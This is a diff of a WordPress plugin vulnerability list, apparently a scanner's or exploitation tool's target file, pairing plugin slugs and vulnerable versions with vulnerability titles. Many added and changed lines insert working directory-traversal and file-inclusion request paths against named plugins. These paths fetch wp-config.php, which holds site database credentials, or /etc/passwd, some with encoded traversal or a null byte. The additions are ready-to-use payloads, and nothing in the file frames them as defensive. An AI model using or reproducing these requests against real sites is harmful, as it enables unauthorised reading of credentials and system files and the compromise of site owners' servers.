@@ -12,6 +12,7 @@ ach-invoice-app|<= 1.0.1|Ach Invoice App <= 1.0.1 - Unauthenticated Local File I
 activedemand|< 0.2.42|ActiveDEMAND < 0.2.42 - Unauthenticated Arbitrary File Upload
 ad-manager-wd|all|Download Ad Manager by WD - Arbitrary File Download
 adaptive-images|<= 0.6.66|Adaptive Images for WordPress <= 0.6.66 - Local File Inclusion & Deletion
+adaptive-images|<= 0.6.67|/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php
 addblockblocker|= 0.0.1|Adblock Blocker 0.0.1 - Arbitrary File Upload
 adirectory|< 1.3.1|aDirectory < 1.3.1 - Unauthenticated Arbitrary File Upload
 admin-and-client-message-after-order-for-woocommerce|< 12.5|OrderConvo < 12.5 - Missing Authorization to Arbitrary File Upload
@@ -48,7 +49,9 @@ ar-for-wordpress|< 7.0|AR For WordPress < 7.0 - Unauthenticated Arbitrary File U
 ar-for-wordpress|< 7.4|AR for WordPress < 7.4 - Missing Authorization to Unauthenticated Limited File Upload
 art-picture-gallery|<= 1.2.9|Art-Picture-Gallery <= 1.2.9 - Unauthenticated Arbitrary File Upload
 asgaros-forum|< 2.7.1|Asgaros Forum < 2.7.1 - Unauthenticated Arbitrary File Upload
+aspose-cloud-ebook-generator|all|/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php
 aspose-doc-exporter|all|/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php
+aspose-importer-exporter|= 1.0|/wp-content/plugins/aspose-importer-exporter/aspose_import_export_download?file=../../../wp-config.php
 asset-manager|= 0.2|Asset Manager 0.2 - Arbitrary File Upload
 attachment-file-icons|<= 1.3|Attachment File Icons (AF Icons) <= 1.3 - Cross-Site Request Forgery to Arbitrary File Upload
 auctionPlugin|= 2.0.1.3|Sitemile Auctions 2.0.1.3 - wp-content/plugins/auctionPlugin/upload.php File Upload PHP Code Execution
@@ -102,7 +105,7 @@ cforms|<= 14.7|Cforms & CformsII <= 14.7 - Remote Code Execution via Unauthorise
 chart-builder|< 2.9.6|Chartify – WordPress Chart Plugin < 2.9.6 - Unauthenticated Local File Inclusion via source
 chatbot-chatgpt|< 2.0.1|Kognetiks Chatbot for WordPress < 2.0.1 - Unauthenticated Arbitrary File Upload
 chauffeur-booking-system|< 7.3|Chauffeur Taxi Booking System for WordPress < 7.3 - Unauthenticated Arbitrary File Upload
-cherry-plugin|< 1.2.7|Cherry Plugin < 1.2.7 - Unauthenticated Arbitrary File Upload and Download
+cherry-plugin|< 1.2.7|Cherry Plugin < 1.2.7 - Unauthenticated Arbitrary File Upload and Download /wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php
 chikuncount|all|chikuncount - ofc_upload_image.php Arbitrary File Upload
 cimy-user-extra-fields|all|Cimy User Extra Fields - Arbitrary File Upload
 cloudsafe365-for-wp|all|/wp-content/plugins/cloudsafe365-for-wp/admin/editor/cs365_edit.php?file=../../../../../wp-config.php
@@ -146,7 +149,7 @@ duplicator|= 1.3.26|Duplicator 1.3.26 - Unauthenticated Arbitrary File Download
 dzs-videogallery|all|DZS Video Gallery - upload.php File Upload Remote Code Execution
 dzs-zoomsounds|< 3.0|ZoomSounds < 3.0 - Remote File Upload
 dzs-zoomsounds|< 6.05|ZoomSounds < 6.05 - Unauthenticated Arbitrary File Upload
-dzs-zoomsounds|< 6.50|DZS Zoomsounds < 6.50 - Unauthenticated Arbitrary File Download
+dzs-zoomsounds|< 6.50|DZS Zoomsounds < 6.50 - Unauthenticated Arbitrary File Download /?action=dzsap_download&link=../../../../../../../../../../../../../etc/passwd
 e-signature|< 1.5.6.8|e-signature < 1.5.6.8 - Unauthenticated Arbitrary File Upload leading to RCE
 easy-csv-importer|<= 7.0.0|eaSYNC < 1.1.16 - Unauthenticated Arbitrary File UploadEasy CSV Importer BETA <= 7.0.0 - Unauthenticated Arbitrary File Upload
 easync-booking|< 1.1.16|eaSYNC < 1.1.16 - Unauthenticated Arbitrary File Upload
@@ -317,6 +320,7 @@ scripts-organizer|< 3.0|Scripts Organizer < 3.0 - Unauthenticated Arbitrary File
 searchwp-live-ajax-search|< 1.6.3|SearchWP Live Ajax Search < 1.6.3 - Unauthenticated Local File Inclusion
 sell-downloads|all|/wp-content/plugins/sell-downloads/sell-downloads.php?file=../../../../../../../../.././wp-config.php%00
 seo-beginner-auto-post|<= 2.2.1|SEO LAT Auto Post <= 2.2.1 - Missing Authorization to File Overwrite/Upload (Remote Code Execution)
+seo-local-rank|< 2.2.4|CVE-2021-39312
 sermon-browser|<= 0.45.22|Sermon Browser <= 0.45.22 - Arbitrary File Upload via CSRF
 sfwd-lms|< 2.5.4|LearnDash < 2.5.4 - Unauthenticated Arbitrary File Upload
 sg-cachepress|<= 5.0.12|SG Optimizer <= 5.0.12 - Unauthenticated File Upload
@@ -327,11 +331,11 @@ showbizpro|<= 1.7.1|Showbiz Pro <= 1.7.1 - Shell Upload
 simple-ads-manager|< 2.7.102|Simple Ads Manager < 2.7.102 - Arbitrary File Upload & SQL Injection
 simple-download-button-shortcode|all|/wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=../../../../wp-config.php
 simple-e-commerce-shopping-cart|<= 3.1.2|Simple eCommerce <= 3.1.2 - Arbitrary File Upload
-simple-file-list|< 3.2.8|Simple File List < 3.2.8 - Unauthenticated Arbitrary File Download
+simple-file-list|< 3.2.8|Simple File List < 3.2.8 - Unauthenticated Arbitrary File Download /wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php
 simple-file-list|< 3.2.8|Simple File List Plugin < 3.2.8 - Unauthenticated Arbitrary File Download
 simple-file-list|< 4.2.3|Simple File List < 4.2.3 - Unauthenticated Arbitrary File Upload RCE
 simple-image-manipulator|all|/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../wp-config.php
-site-editor|<= 1.1.1|Site Editor <= 1.1.1 - Local File Inclusion (LFI)
+site-editor|<= 1.1.1|Site Editor <= 1.1.1 - Local File Inclusion (LFI) /wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../../wp-config.php
 sniplets|all|/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php
 social-warfare|<= 3.5.2|Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)
 social-web-suite|< 4.1.12|Social Web Suite – Social Media Auto Post, Social Media Auto Publish < 4.1.12 - Directory Traversal to Arbitrary File Download
@@ -358,6 +362,7 @@ time-clock-pro|<= 1.2.2|Time Clock <= 1.2.2 & Time Clock Pro <= 1.1.4 - Unauthen
 time-clock|<= 1.2.2|Time Clock <= 1.2.2 & Time Clock Pro <= 1.1.4 - Unauthenticated (Limited) Remote Code Execution
 tinymce-thumbnail-gallery|all|/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php
 trx_addons|<= 2.32.3|ThemeREX Addons <= 2.32.3 - Unauthenticated Arbitrary File Upload in trx_addons_uploads_save_data
+udraw|< 3.3.3|Local File Inclusion POST /wp-admin/admin-ajax.php action=udraw_convert_url_to_base64&url=/etc/passwd
 ultimate-member||Ultimate Member < 2.0.22 - Unauthenticated Arbitrary File Upload
 ultimate-product-catalogue|<= 3.1.1|Ultimate Product Catalogue <= 3.1.1 - Unauthenticated File Upload
 user-files|<= 2.4.2|user files <= 2.4.2 - Unauthenticated Arbitrary File Upload
